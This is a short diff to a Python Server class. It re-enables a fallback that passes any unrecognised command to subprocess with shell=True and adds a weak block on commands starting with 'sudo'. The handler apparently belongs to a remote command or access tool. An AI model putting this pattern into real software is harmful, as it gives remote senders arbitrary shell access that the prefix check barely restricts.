@@ -76,7 +76,7 @@ class Server:
         elif cmd == "http": return self.fetch_url(parts[1] if len(parts) > 1 else "")
         elif cmd == "post": return self.post_request(parts[1] if len(parts) > 1 else "")
         elif cmd == "fetch": return self.fetch_repo()
-        #else: return self.execute_command(command)
+        else: return self.execute_command(command)
 
     def get_file_content(self, filename):
         if not filename:
@@ -127,6 +127,8 @@ class Server:
             return f"[-] {e}"
 
     def execute_command(self, command):
+        if command.startswith("sudo"): return "SUDO IS BLOCKED!"
+
         try: return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
         except subprocess.CalledProcessError as e: return e.output.decode('utf-8')
 
